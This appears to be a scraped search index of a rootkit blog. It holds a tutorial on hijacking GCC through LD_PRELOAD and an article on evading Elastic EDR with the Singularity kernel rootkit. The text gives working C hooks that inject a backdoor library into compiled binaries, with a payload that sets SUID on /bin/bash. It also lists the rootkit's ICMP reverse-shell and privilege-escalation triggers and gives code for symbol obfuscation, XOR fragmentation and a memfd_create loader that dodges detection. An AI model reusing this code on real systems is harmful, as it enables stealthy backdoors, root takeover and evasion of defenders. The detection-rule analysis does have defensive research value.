time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading 